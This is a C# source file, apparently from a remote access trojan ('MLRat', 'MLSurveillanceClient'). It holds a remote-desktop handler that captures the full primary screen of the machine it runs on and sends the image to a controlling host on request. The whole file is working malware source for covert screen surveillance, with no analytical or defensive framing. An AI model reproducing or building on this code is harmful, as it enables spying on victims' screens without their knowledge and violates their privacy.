using MLRat.Client;
using MLSurveillanceSharedCode.Network;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace MLSurveillanceClient.Handlers
{
    public static class RemoteDesktopHandler
    {
        private static IClientConnection NetworkHost;
        public static void SetNetworkHost(IClientConnection host)
        {
            NetworkHost = host;
        }
        public static void Handle(object[] data)
        {
            var command = (RemoteDesktopCommand)data[1];
            lock (NetworkHost)
            {
                if (command == RemoteDesktopCommand.RequestFrame)
                    NetworkHost.Send((byte)NetworkCommand.RemoteDesktop, (byte)RemoteDesktopCommand.Frame, TakeScreenshot());
            }
        }

        private static byte[] TakeScreenshot()
        {
            var screen = Screen.PrimaryScreen;
            using (var bmp = new Bitmap(screen.Bounds.Width, screen.Bounds.Height))
            {
                var g = Graphics.FromImage(bmp);
                g.CopyFromScreen(0, 0, 0, 0, screen.Bounds.Size);
                g.Dispose();
                using (var ms = new MemoryStream())
                {
                    bmp.Save(ms, ImageFormat.Png);
                    return ms.ToArray();
                }
            }
        }
    }
}
